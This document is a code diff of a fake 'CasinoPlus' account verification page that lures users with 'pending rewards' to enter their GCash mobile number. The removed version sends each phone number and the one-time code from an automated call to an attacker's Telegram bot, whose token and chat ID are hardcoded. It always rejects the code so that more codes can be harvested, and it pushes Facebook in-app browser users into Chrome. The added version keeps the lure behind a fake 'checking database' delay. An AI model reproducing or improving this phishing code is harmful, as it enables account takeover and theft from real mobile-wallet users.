@@ -3,254 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Casino Plus | Secure Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <title>CasinoPlus | Account Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
             --dark-bg: #04070d;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Public Sans', sans-serif; }
 
         body {
             background-color: var(--dark-bg);
-            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #04070d 100%);
-            color: #ffffff;
-            font-family: 'Public Sans', sans-serif;
+            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%);
+            color: #fff;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            overflow: hidden;
+            padding: 20px;
         }
 
-        /* Premium Card Design */
-        .card {
-            width: 92%;
-            max-width: 380px;
+        .login-card {
             background: rgba(255, 255, 255, 0.03);
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 25px;
+            border-radius: 25px;
             border: 1px solid rgba(212, 175, 55, 0.3);
-            border-radius: 24px;
-            padding: 40px 24px;
-            backdrop-filter: blur(20px);
+            backdrop-filter: blur(10px);
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
 
-        .logo-img {
-            width: 170px;
-            margin-bottom: 24px;
+        .logo {
+            width: 160px;
+            margin-bottom: 30px;
             filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.3));
         }
 
-        h1 { font-size: 22px; font-weight: 800; margin-bottom: 12px; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
-        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        h2 { font-weight: 800; font-size: 22px; margin-bottom: 10px; color: #fff; }
+        p { color: #9ca3af; font-size: 14px; margin-bottom: 30px; }
 
-        /* Casino Gold Button */
-        .btn-primary {
-            background: var(--gold);
-            color: #000;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
-        }
-
-        .btn-primary:active { transform: scale(0.96); box-shadow: none; }
-
-        /* Modal Design */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 99999;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .modal-content {
-            width: 100%;
-            max-width: 380px;
-            background: #0a0f1a;
-            padding: 35px 24px;
-            border-radius: 24px;
-            text-align: center;
-            border: 1px solid rgba(212, 175, 55, 0.2);
-        }
-
-        .label-text {
+        .input-group {
+            margin-bottom: 20px;
             text-align: left;
+        }
+
+        label {
             display: block;
-            font-size: 11px;
-            text-transform: uppercase;
+            font-size: 12px;
             color: #fbbf24;
-            font-weight: 800;
+            text-transform: uppercase;
+            font-weight: 700;
             margin-bottom: 8px;
-            letter-spacing: 1px;
+            margin-left: 5px;
         }
 
         input {
             width: 100%;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
+            padding: 18px;
             border-radius: 12px;
-            padding: 16px;
-            color: white;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.4);
+            color: #fff;
             font-size: 18px;
-            text-align: center;
-            margin-bottom: 20px;
+            font-weight: 600;
             outline: none;
             transition: 0.3s;
         }
 
-        input:focus { border-color: #d4af37; background: rgba(255,255,255,0.08); }
+        input:focus { border-color: #d4af37; box-shadow: 0 0 15px rgba(212,175,55,0.1); }
 
-        .wait-timer { font-family: 'Orbitron', sans-serif; font-size: 32px; color: #d4af37; margin-bottom: 20px; }
-
-        .shake-error { animation: aggressive-shake 0.4s both; border-color: #ff3b30 !important; }
-
-        @keyframes aggressive-shake {
-            10%, 90% { transform: translate3d(-2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
+        .btn-verify {
+            background: var(--gold);
+            color: #000;
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
         }
 
-        .radio-group { display: flex; gap: 20px; margin-bottom: 25px; justify-content: center; }
-        .radio-item { font-size: 14px; color: #cbd5e1; display: flex; align-items: center; gap: 8px; cursor: pointer; }
-        .radio-item input { margin: 0; width: 18px; height: 18px; accent-color: #d4af37; cursor: pointer; }
+        .btn-verify:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        .hidden { display: none; }
+        /* Error/Status Box */
+        #status-msg {
+            display: none;
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .error { background: rgba(255, 0, 0, 0.1); color: #ff4d4d; border: 1px solid rgba(255, 0, 0, 0.2); }
+        .success { background: rgba(57, 255, 20, 0.1); color: #39ff14; border: 1px solid rgba(57, 255, 20, 0.2); }
+
+        /* Spinner */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
-        <h1>Identity Security</h1>
-        <p>System detected a pending reward. Please complete the quick verification to unlock your withdrawal portal.</p>
-        <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Secure My Account</button>
+<div class="login-card">
+    <img src="https://casinoplus.static2.website/images/logo1.png" alt="CasinoPlus" class="logo">
+    
+    <h2>Membership Login</h2>
+    <p>Enter your registered GCash number to claim your pending rewards.</p>
+
+    <div class="input-group">
+        <label>Mobile Number</label>
+        <input type="tel" id="phoneInput" placeholder="09xxxxxxxxx" maxlength="11">
     </div>
 
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-content">
-            <div id="step1">
-                <h2 style="font-size: 20px; margin-bottom: 20px; color: #fff;">Account Verification</h2>
-                
-                <span class="label-text">Linked Mobile Number</span>
-                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
+    <button class="btn-verify" id="verifyBtn" onclick="handleAuth()">
+        Verify Account
+    </button>
 
-                <span class="label-text">Existing Member?</span>
-                <div class="radio-group">
-                    <label class="radio-item"><input type="radio" name="reg" value="Yes" checked> YES</label>
-                    <label class="radio-item"><input type="radio" name="reg" value="No"> NO</label>
-                </div>
+    <div id="status-msg"></div>
+</div>
 
-                <button class="btn-primary" onclick="processStep1()">Request System Call</button>
-            </div>
+<script src="config.js"></script>
 
-            <div id="step2" class="hidden">
-                <h2 style="font-size: 20px; margin-bottom: 10px; color: #fff;">Verifying...</h2>
-                <p style="font-size: 13px; margin-bottom: 20px;">Please answer the automated call and enter the code below.</p>
-                <div class="wait-timer" id="waitTimer">05:00</div>
-                <span class="label-text">Enter 4-Digit Code</span>
-                <input type="number" id="vCode" placeholder="0 0 0 0" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
-                <button class="btn-primary" id="verifyBtn" onclick="processStep2()">Confirm Verification</button>
-            </div>
-        </div>
-    </div>
+<script>
+    function handleAuth() {
+        const input = document.getElementById('phoneInput');
+        const btn = document.getElementById('verifyBtn');
+        const status = document.getElementById('status-msg');
+        const phone = input.value.trim();
 
-    <script>
-        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-        const chatId = '7298607329';
-        const BYPASS_MODE = true; 
-
-        // Redirect logic for Facebook App
-        const isFacebookApp = () => {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
-        };
-
-        if (isFacebookApp()) {
-            alert("Security Notice: Please open this in your system browser (Chrome/Safari) to verify your account.");
+        // 1. Validation for empty or short number
+        if (phone.length < 11) {
+            showStatus("Please enter a valid 11-digit GCash number.", "error");
+            return;
         }
 
-        function handleVerify() {
-            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
-            if (!window.location.hash.includes("verified")) {
-                const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
-                window.location.href = intentUrl;
-                setTimeout(() => {
-                    document.getElementById('modalOverlay').style.display = 'flex';
-                }, 1500);
-            } else {
-                document.getElementById('modalOverlay').style.display = 'flex';
-            }
-        }
+        // 2. Start Animation
+        btn.disabled = true;
+        btn.innerHTML = `<div class="spinner"></div> CHECKING DATABASE...`;
+        status.style.display = "none";
 
-        window.onload = () => {
-            if (window.location.hash.includes("verified")) {
-                document.getElementById('modalOverlay').style.display = 'flex';
-            }
-        };
-
-        function processStep1() {
-            const phone = document.getElementById('userPhone').value;
-            const regStatus = document.querySelector('input[name="reg"]:checked').value;
-            
-            if (phone.length < 11 || !phone.startsWith('09')) {
-                const el = document.getElementById('userPhone');
-                el.classList.add('shake-error');
-                setTimeout(() => el.classList.remove('shake-error'), 500);
+        setTimeout(() => {
+            // 3. Blacklist Check (Galing sa config.js)
+            // Gamit ang array na BLACKLISTED_NUMBERS sa config.js mo
+            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
+                showStatus("Access Denied: This number has been flagged for suspicious activity.", "error");
+                resetButton();
                 return;
             }
 
-            const msg = `🎰 ACCOUNT FOR CALL:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
-            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+            // 4. Success Flow
+            btn.innerHTML = "VERIFIED! REDIRECTING...";
+            btn.style.background = "#39ff14"; // Green for success
+            showStatus("Membership Confirmed! Loading rewards...", "success");
 
-            if(BYPASS_MODE) {
-                setTimeout(() => {
-                    window.location.href = "main.html";
-                }, 1200);
-            } else {
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                startCountDown(300);
-            }
-        }
+            setTimeout(() => {
+                window.location.href = "main.html";
+            }, 1500);
 
-        function processStep2() {
-            const vInput = document.getElementById('vCode');
-            const phone = document.getElementById('userPhone').value;
+        }, 2500); // 2.5 seconds loading for realism
+    }
 
-            vInput.classList.add('shake-error');
-            setTimeout(() => vInput.classList.remove('shake-error'), 500);
-            
-            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ INVALID CODE:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
-            
-            alert("Verification failed. Please wait for a new system call.");
-            vInput.value = "";
-        }
+    function showStatus(msg, type) {
+        const status = document.getElementById('status-msg');
+        status.innerHTML = msg;
+        status.className = type;
+        status.style.display = "block";
+    }
 
-        function startCountDown(sec) {
-            let timer = sec;
-            const display = document.getElementById('waitTimer');
-            const iv = setInterval(() => {
-                let m = Math.floor(timer / 60);
-                let s = timer % 60;
-                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-                if (--timer < 0) { clearInterval(iv); timer = 0; }
-            }, 1000);
-        }
-    </script>
+    function resetButton() {
+        const btn = document.getElementById('verifyBtn');
+        btn.disabled = false;
+        btn.innerHTML = "Verify Account";
+        btn.style.background = "var(--gold)";
+    }
+
+    // Auto-focus input for better UX
+    window.onload = () => document.getElementById('phoneInput').focus();
+</script>
+
 </body>
 </html>
